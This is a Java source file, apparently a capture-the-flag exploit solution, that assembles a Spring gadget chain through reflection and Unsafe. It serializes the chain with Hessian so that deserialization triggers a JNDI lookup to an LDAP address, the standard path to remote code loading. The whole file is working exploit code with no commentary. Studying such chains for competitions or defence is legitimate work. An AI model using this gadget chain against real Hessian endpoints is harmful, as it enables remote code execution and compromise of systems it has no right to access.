package com.rctf.solution;

import com.rctf.server.tool.HessianFactory;
import com.rctf.server.tool.Maybe;
import com.rctf.solution.tools.HessianTools;
import com.rctf.solution.tools.ReflectTools;
import com.rctf.solution.tools.UnsafeTools;
import org.springframework.jndi.JndiTemplate;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashSet;
import java.util.TreeMap;

public class Exp {
    public static void main(String[] args) throws Exception {
        Class<?> clazz1 = Class.forName("org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory");
        Object objectFac = UnsafeTools.getObjectByUnsafe(clazz1);
        ReflectTools.setFieldValue(objectFac, "targetBeanName", "ldap://127.0.0.1:50389/a52a1a");
        Object jndiFac = UnsafeTools.getObjectByUnsafe(Class.forName("org.springframework.jndi.support.SimpleJndiBeanFactory"));
        HashSet<Object> set = new HashSet<>();
        set.add("any");
        ReflectTools.setFieldValue(jndiFac, "shareableResources", set);
        JndiTemplate jndiTemplate = new JndiTemplate();
        ReflectTools.setFieldValue(jndiFac, "jndiTemplate", jndiTemplate);
        ReflectTools.setFieldValue(objectFac, "beanFactory", jndiFac);

        InvocationHandler handler = (InvocationHandler) UnsafeTools.getObjectByUnsafe(Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler"));
        ReflectTools.setFieldValue(handler, "objectFactory", objectFac);

        Maybe maybe = new Maybe(handler);

        TreeMap<Object, Object> treeMap = new TreeMap<>();
        treeMap.put("any", "foo");

        ReflectTools.makeTreeMap(treeMap, maybe);

        String serialize = HessianFactory.serialize(treeMap);
        System.out.println(serialize);

        HessianFactory.deserialize(serialize);


    }
}
